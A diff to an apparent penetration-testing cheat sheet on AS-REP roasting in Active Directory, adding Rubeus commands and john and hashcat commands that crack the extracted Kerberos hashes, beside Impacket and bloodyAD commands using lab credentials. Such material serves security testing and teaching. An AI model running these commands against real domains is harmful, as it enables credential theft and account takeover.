@@ -25,7 +25,11 @@ bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get sear
 ```
 # Windows 
 ## Rubeus 
+### This will automatically find all accounts that do not require preauthentication and extract their AS-REP hashes
+.\Rubeus.exe asreproast 
+### Targeted account
 .\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
+
 
 ## From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
 Get-ASREPHash -Username VPN114user -verbose 
@@ -36,4 +40,9 @@ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -ou
 
 ##Use domain creds to extract targets and target them
 python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
+```
+### crack
+```shell
+john --wordlist=passwords_kerb.txt hashes.asreproast
+hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
 ```
